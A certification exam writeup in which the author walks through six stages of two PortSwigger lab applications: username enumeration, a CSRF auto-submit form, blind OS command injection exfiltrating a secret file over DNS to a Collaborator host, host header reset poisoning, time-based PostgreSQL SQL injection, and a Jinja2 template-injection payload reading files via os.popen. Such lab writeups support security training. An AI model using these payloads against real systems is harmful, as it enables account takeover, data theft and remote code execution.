# Burp Suite Certified Practitioner (BSCP) — Exam Writeup

**Author:** Dhruv Sharma
**Result:** ✅ Passed
**Certification:** Burp Suite Certified Practitioner (BSCP)

---

## Introduction

I recently sat for the **Burp Suite Certified Practitioner (BSCP)** exam and am happy to share that I passed it. This writeup documents my approach, the vulnerabilities I encountered, and the exact exploitation steps I followed for each stage. I'm publishing this for anyone preparing for the exam, to give a sense of the methodology required rather than a fixed "cheat sheet" — since PortSwigger randomizes the vulnerability per stage, no two attempts look exactly alike.

If you're studying for BSCP, my biggest piece of advice: don't go in cold. Practice every relevant lab category on the PortSwigger Web Security Academy beforehand (XSS, SQLi, SSRF, SSTI, Access Control, CSRF, Request Smuggling, XXE), and get comfortable with Burp extensions like Param Miner — you will need them.

---

## Exam Format

The exam consists of **2 separate web applications**, each broken into **3 progressive stages**:

1. **Stage 1** — Anonymous access → Regular user session
2. **Stage 2** — Regular user session → Administrator session
3. **Stage 3** — Administrator session → Remote command execution

The vulnerability at each stage is randomized — there is no fixed "path" to follow. The exam is also heavily time-constrained, so efficient triage (quickly identifying *which* vulnerability class you're dealing with) matters as much as the exploitation itself.

---

## Tools Used

- Burp Suite Professional
- Param Miner (header/parameter guessing)
- Burp Collaborator (for blind/out-of-band vulnerabilities)

---

## App 1 — Stage-by-Stage Breakdown

### Stage 1: Username Enumeration via Forgot Password

**Identification:**
The login page had a "Forgot password" feature. Submitting `carlos` versus a `foo` username returned **different response messages** — a clear sign of username enumeration.

**Exploitation:**
- Confirmed that submitting a valid username (`carlos`) returned a distinct message compared to an invalid one.
- Used this enumeration to confirm `carlos` as a valid account on the system, which set up the next stage.

**Result:** Valid username confirmed, paving the way for privilege escalation via CSRF in Stage 2.

---

### Stage 2: User → Administrator Session — CSRF (Token Not Validated)

**Identification:**
On the "Change Email" feature, removing the CSRF token from the request still resulted in the request being accepted — confirming the endpoint was vulnerable to CSRF.

**Exploitation:**

Built a CSRF PoC that, when loaded by an authenticated administrator, would silently change their account email to an address I controlled (hosted on the Burp Exploit Server):

```html
<html>
<meta name="referrer" content="no-referrer">
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://abcd.web-security-academy.net/account/change-email" method="POST">
      <input type="hidden" name="email" value="administrator@exploit-abcd.exploit-server.net" />
      <input type="hidden" name="form-id" value="HQAFlu" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Steps:**
1. Hosted the PoC on the Exploit Server and delivered it to the victim (administrator).
2. The administrator's account email was silently changed to an address under my control.
3. Triggered "Forgot Password" for the `administrator` account.
4. The password reset link was delivered to my Exploit Server's email client (since I now owned the email tied to that account).
5. Used the reset link to set a new password for `administrator`.

**Result:** Full administrator account takeover.

---

### Stage 3: Administrator → Command Execution — Blind OS Command Injection

**Identification:**
The admin panel's image-handling endpoint accepted an `imagesize` parameter that was passed unsanitized into a shell command (likely via ImageMagick), enabling blind OS command injection.

**Exploitation:**

```http
GET /administrator/metrics/blog-images?imageName=8&imagesize=%22%60nslookup%20%24%28cat%20/home/carlos/secret%29.abcxyz123.oastify.com%60%22 HTTP/2
```

Decoded payload:
```
imagesize="`nslookup $(cat /home/carlos/secret).abcxyz123.oastify.com`"
```

**Steps:**
1. Generated a unique Burp Collaborator subdomain.
2. Injected the payload above into the `imagesize` parameter, using backticks to execute `cat` on the target secret file and pipe its output into a DNS lookup against my Collaborator subdomain.
3. Polled Burp Collaborator for incoming DNS interactions.
4. The exfiltrated file contents (`/home/carlos/secret`) appeared as a subdomain label in the DNS request.

**Result:** Out-of-band data exfiltration confirmed remote command execution as administrator, retrieving the contents of `/home/carlos/secret`.

---

## App 2 

### Stage 1: Host Header Poisoning (Password Reset Poisoning)

**Identification:**
A `tracking.js` script referencing the application's own hostname was present in the page source — a strong indicator of host-header-dependent behavior, often exploitable via password reset poisoning.

**Exploitation:**
- Used Param Miner's "Guess headers" feature against the password reset request to identify injectable headers. Multiple headers were tested, including `X-Forwarded-Host`, `X-Forwarded-Server`, and `X-Host`.
- Injected the Exploit Server's domain into the working header on the "Forgot Password" request for the target user.
- The application generated a password reset email containing a reset link built using the poisoned host header — meaning the link pointed to my Exploit Server instead of the legitimate app.
- The reset token was captured in the Exploit Server's access logs.
- Used the leaked token to reset the victim (`carlos`) user's password.

**Result:** Account takeover via host header poisoning, gaining a valid low-privilege user session.

---

### Stage 2: User → Administrator Session — SQL Injection (Time-Based Blind)

**Identification:**
The application exposed an "Advanced Search" feature. Testing a single quote in the `searchterm` parameter caused a `500 Internal Server Error`, suggesting unsanitized input was reaching the database query. A PostgreSQL time-delay payload confirmed time-based blind SQL injection.

**Exploitation:**

Confirmed the injection point and bracket-closing pattern required by the query context:

```
searchterm=x'));SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--+-
```

This caused a consistent 5-second response delay, confirming the injection.

Used the following payload (via Burp Intruder, Cluster Bomb attack) to extract the administrator's password character-by-character:

```
?searchterm=x'));SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§2§,1)='§a§')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--+-&sort=DATE&writer=Sam+Sandwich
```

**Steps:**
1. Position 1 (`§2§`): numeric payload set, representing the character index (1 to password length).
2. Position 2 (`§a§`): alphanumeric character set (a–z, A–Z, 0–9).
3. Resource pool restricted to a single concurrent thread to avoid corrupting the time-based responses.
4. Sorted Intruder results by response time — any combination triggering a 3+ second delay indicated a correct character at that position.
5. Reconstructed the administrator's password one character at a time from the confirmed delays.

**Result:** Extracted the administrator's plaintext password and used it to log in with full administrator privileges.

---

### Stage 3: Administrator → Command Execution — Server-Side Template Injection (Jinja2)

**Identification:**
The admin panel exposed a password-reset email template editable by the administrator, indicating potential server-side template injection (SSTI).

**Exploitation:**

**Steps:**
1. As administrator, changed the account email to an address under my control.
2. Edited the email template and inserted the polyglot/test payload `{{7*7}}`.
3. Logged out of the administrator session.
4. Triggered "Forgot Password" for the `administrator` account.
5. The resulting password reset email rendered `49` in place of `{{7*7}}`, confirming template injection.
6. Followed up with `{{7*'7'}}`, which rendered `7777777`, confirming the templating engine was **Jinja2**.
7. Crafted a remote-code-execution payload to read the target secret file:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read() }}
```

8. Inserted this payload into the email template, logged out, and triggered another password reset for `administrator`.
9. The rendered output in the reset email contained the contents of `/home/carlos/secret`.

**Result:** Full remote command execution achieved via SSTI, retrieving the final secret and completing the exam.

---

## Conclusion

Passing the BSCP exam validated months of hands-on practice across the PortSwigger Web Security Academy labs. This writeup reflects my own exam attempt; vulnerabilities, parameters, and payloads will differ for every candidate since PortSwigger randomizes the exam content. I hope this serves as a useful reference for understanding the *methodology* behind tackling each stage, rather than a literal step-by-step guide to copy.

Good luck to anyone preparing for BSCP — the structured, hands-on approach of the Web Security Academy is the best preparation you can get.

